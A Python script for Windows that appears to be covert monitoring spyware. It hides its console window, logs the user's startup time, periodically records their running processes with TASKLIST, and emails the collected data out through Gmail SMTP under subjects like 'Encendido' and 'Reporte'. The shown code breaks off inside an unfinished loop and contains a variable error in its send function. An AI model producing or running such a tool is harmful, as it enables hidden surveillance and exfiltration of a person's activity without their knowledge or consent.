#!/usr/bin/python3

import time, datetime
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess
import win32console
import win32gui
from datetime import datetime

vent = win32console.GetConsoleWindow()
win32gui.ShowWindow(vent,0)

mail = ''
passw = ''
to = ''
wait_seconds = 7200 
timeout = time.time() + wait_seconds
second_time = 1800
time_measure = time.time() + second_time

def Rdpross():
    mess = ''
    a = os.getlogin()
    subprocess.call(['TASKLIST','/FO','TABLE','/V','/FI','STATUS eq running','/FI','USERNAME eq {}'.format(a),'/FI','CPUTIME gt 0:00:00','>Nsee.txt'],shell=True)  
    arch = open("Nsee.txt","r")
    for linea in arch.readlines():
        m = '{} \n{} '
        mess = m.format(mess,linea)
    arch.close()
    garch = open("Nse.txt","a")
    garch.write(mess)
    garch.close()
    
    
def Timeout():
    
    if time.time() > timeout:
        return True
    else:
        return False
    
def Time_measure():
    
    if time.time() > time_measure:
        return True
    else:
        return False
    
def SendData(s):
    msg = MIMEMultipart()
    passw = passw
    msg['From'] = mail
    msg['To'] = to
    msg['Subject'] = s
    with open('Nse.txt','rt') as fp:
        neo = MIMEText(fp.read())
    msg.attach(neo)
    harc = open("Nse.txt","w")
    harc.write("")
    harc.close()
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'],passw)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()
    except:
        pass

def One():
    arch = open("Nse.txt","w")
    arch.write("Hora de encendido: {}".format(datetime.now()))
    arch.close()
    SendData('{} Encendido'.format(os.getlogin()))

One()
while True:
    try:
        if Time_measure():
            Rdpross()
            time_measure = time.time() + second_time
            
        if Timeout():
            SendData('Reporte Nbaccu de: {}'.format(os.getlogin()))
            timeout = time.time() + wait_seconds
    

